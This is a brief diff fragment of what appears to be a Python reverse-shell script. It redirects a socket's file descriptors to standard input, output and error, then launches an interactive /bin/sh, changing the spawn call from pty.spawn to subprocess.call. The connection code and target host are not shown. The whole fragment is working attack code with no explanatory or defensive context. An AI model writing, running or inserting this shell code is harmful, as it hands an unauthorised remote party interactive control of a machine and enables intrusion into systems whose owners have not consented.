@@ -75,5 +75,4 @@ print b,c
 os.dup2(s.fileno(),0)
 os.dup2(s.fileno(),1)
 os.dup2(s.fileno(),2)
-pty.spawn("/bin/sh -i")
-#subprocess.call(["/bin/sh","-i"]);
+subprocess.call(["/bin/sh","-i"]);
